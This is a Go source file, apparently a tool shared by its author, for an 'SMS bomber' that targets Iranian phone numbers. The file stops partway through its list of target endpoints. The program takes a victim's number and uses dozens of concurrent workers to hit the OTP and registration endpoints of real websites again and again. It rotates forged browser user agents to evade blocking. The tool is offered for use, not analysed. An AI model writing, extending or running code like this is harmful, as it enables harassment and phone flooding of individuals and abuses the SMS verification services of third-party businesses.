/* coded by @monsmain
⚠️NOTE en:
The right to use this code is reserved only for its owner; any unauthorized copying will be pursued to the full force of the law.
The right to use this code is reserved only for its owner; any unauthorized copying will be pursued to the full force of the law.
The right to use this code is reserved only for its owner; any unauthorized copying will be pursued to the full force of the law.
The right to use this code is reserved only for its owner; any unauthorized copying will be pursued to the full force of the law.
*/
package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
	"net/http/cookiejar"
	"math/rand" 
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.2420.81",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.2365.66",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.2277.83",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.2210.133",
	"Mozilla/5.0 (iPad; CPU OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.2151.58",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0",
	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.46",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:118.0) Gecko/20100101 Firefox/118.0",
	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:117.0) Gecko/20100101 Firefox/117.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:117.0) Gecko/20100101 Firefox/117.0",
	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.69",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:116.0) Gecko/20100101 Firefox/116.0",
	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
}
//Code by @monsmain
func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func sendJSONRequest(client *http.Client, ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	randomIndex := rand.Intn(len(userAgents))
	selectedUserAgent := userAgents[randomIndex]

	const maxRetries = 3
	const retryDelay = 2 * time.Second

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:
		}

		jsonData, err := json.Marshal(payload)
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while encoding JSON for %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}
		req.Header.Set("Content-Type", "application/json")
        req.Header.Set("User-Agent", selectedUserAgent) 


		resp, err := client.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return
	}
}
//Code by @monsmain
func sendFormRequest(client *http.Client, ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	randomIndex := rand.Intn(len(userAgents))
	selectedUserAgent := userAgents[randomIndex]

	const maxRetries = 3
	const retryDelay = 3 * time.Second

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:

		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating form request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
        req.Header.Set("User-Agent", selectedUserAgent) 


		resp, err := client.Do(req)
		if err != nil {

			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {

				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return
	}
}
func sendGETRequest(client *http.Client, ctx context.Context, url string, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	randomIndex := rand.Intn(len(userAgents))
	selectedUserAgent := userAgents[randomIndex]


	const maxRetries = 3
	const retryDelay = 2 * time.Second

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating GET request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}
        req.Header.Set("User-Agent", selectedUserAgent)


		resp, err := client.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return
	}
}
//Code by @monsmain
func formatPhoneWithSpaces(p string) string {
	p = getPhoneNumberNoZero(p)
	if len(p) >= 10 {
		if len(p) >= 10 {
			return p[0:3] + " " + p[3:6] + " " + p[6:10]
		}
		return p
	}
	return p
}
func getPhoneNumberNoZero(phone string) string {
	if strings.HasPrefix(phone, "0") {
		return phone[1:]
	}
	return phone
}

func getPhoneNumber98NoZero(phone string) string {
	return "98" + getPhoneNumberNoZero(phone)
}

func getPhoneNumberPlus98NoZero(phone string) string {
	return "+98" + getPhoneNumberNoZero(phone)
}

func main() {

	rand.Seed(time.Now().UnixNano())

	clearScreen()

	fmt.Print("\033[01;32m")
	fmt.Print(`
                                :-.                                   
                         .:   =#-:-----:                              
                           **%@#%@@@#*+==:                            
                       :=*%@@@@@@@@@@@@@@%#*=:                        
                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
`)
	fmt.Print("\033[01;37m")
	fmt.Print(`
           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
            *@@%#             -@@@@@@.            #@@@+             
            .%@@#  @monsmain  +@@@@@@=  Sms Bomber #@@#              
             :@@*            =%@@@@@@%-   irani    *@@:              
              #@@%         .*@@@@#%@@@%+.         %@@+              
              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
`)
	fmt.Print("\033[01;31m")
	fmt.Print(`
              *@@@@#++*#%@@@@@@+   #@@@@@@%#+++%@@@@=              
               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
                      #@@@@@@@@@@@@@@@@@@@@@@+                      
                       *@@@@@@@@@@@@@@@@@@@@+                       
                        +@@%*@@%@@@%%@%*@@%=                         
                         +%+ %%.+@%:-@* *%-                          
                          .  %# .%#  %+                              
                             :.  %+  :.                              
                                 -:                                  
`)
	fmt.Print("\033[0m")


	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m156 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxx]: \033[00;36m")
	var phone string
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms&call : \033[00;36m")
	fmt.Scan(&repeatCount)

	var speedChoice string
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mChoose speed [medium/fast]: \033[00;36m")
	fmt.Scan(&speedChoice)

	var numWorkers int 
//Code by @monsmain
	switch strings.ToLower(speedChoice) { 
	case "fast":

		numWorkers = 90 
		fmt.Println("\033[01;33m[*] Fast mode selected. Using", numWorkers, "workers.\033[0m")
	case "medium":

		numWorkers = 40 
		fmt.Println("\033[01;33m[*] Medium mode selected. Using", numWorkers, "workers.\033[0m")
	default:

		numWorkers = 40 
		fmt.Println("\033[01;31m[-] Invalid speed choice. Defaulting to medium mode using", numWorkers, "workers.\033[0m")
	}//Code by @monsmain


	ctx, cancel := context.WithCancel(context.Background())
	signalChan := make(chan os.Signal, 1)

	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-signalChan
		fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m")
		cancel()
	}()

cookieJar, _ := cookiejar.New(nil)
	client := &http.Client{
		Jar: cookieJar,
        Timeout: 10 * time.Second,
	}

	tasks := make(chan func(), repeatCount*145)

	var wg sync.WaitGroup

	ch := make(chan int, repeatCount*145)

	for i := 0; i < numWorkers; i++ {
		go func() {
			for task := range tasks {
				task()
			}
		}()
	}

	for i := 0; i < repeatCount; i++ {
		
               // darsban.com (JSON) ✅ 
               wg.Add(1)
               tasks <- func(c *http.Client) func() {
                        return func() {
               payload := map[string]interface{}{
                "type":  "firstPhone",
                "phone": phone, 
                }
                sendJSONRequest(c, ctx, "https://www.darsban.com/api/usersmslogin", payload, &wg, ch)
                }
        }(client)

		// novinparse.com (SMS - POST Form) ✅ 
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("Action", "SendVerifyCode")
				formData.Set("mobile", phone)
				formData.Set("verifyCode", "")
				formData.Set("repeatFlag", "true")
				formData.Set("Language", "FA")
				formData.Set("ipaddress", "95.38.60.151")
				sendFormRequest(c, ctx, "https://novinparse.com/page/pageaction.aspx", formData, &wg, ch) 
			}
		}(client) 

               // Fitamin.ir (JSON Request) ✅ 
               wg.Add(1)
               tasks <- func(c *http.Client) func() {
	               return func() {
		payload := map[string]interface{}{
			"mobile": getPhoneNumber98NoZero(phone),
		}
		sendJSONRequest(c, ctx, "https://services.fitamin.ir/fitamin-central-service/api/fitamin/send-verification-code", payload, &wg, ch)
         	}
              }(client)
                //operator-100.ir
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("email", phone)
				sendFormRequest(c, ctx, "https://operator-100.ir/api/customer/member/register/", formData, &wg, ch)
			}
		}(client)
                //gama.ir ✅ 
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("identity", phone)  
